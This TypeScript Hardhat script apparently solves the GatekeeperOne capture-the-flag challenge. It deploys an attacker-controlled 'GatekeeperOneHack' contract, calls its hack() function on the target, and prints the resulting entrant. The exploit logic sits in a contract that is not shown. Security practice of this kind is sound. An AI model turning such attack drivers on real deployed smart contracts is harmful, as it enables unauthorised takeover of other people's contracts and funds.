import { fail } from "assert";
import { ethers } from "hardhat";

async function gatekeeperOneHack() {
  const gatekeeperOneAddress = process.env.GATEKEEPER_ONE_ADDRESS || fail("GATEKEEPER_ONE_ADDRESS Not Found In .env");
  const [, attacker] = await ethers.getSigners();
  const gatekeeperOne = await ethers.getContractAt("GatekeeperOne", gatekeeperOneAddress);

  const GatekeeperOneHack = await ethers.getContractFactory("GatekeeperOneHack");
  const gatekeeperOneHack = await GatekeeperOneHack.connect(attacker).deploy();
  await gatekeeperOneHack.deployed();

  const tx = await gatekeeperOneHack.connect(attacker).hack(gatekeeperOneAddress);
  await tx.wait();

  console.log(await gatekeeperOne.entrant());
  console.log(await attacker.getAddress());
}

gatekeeperOneHack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
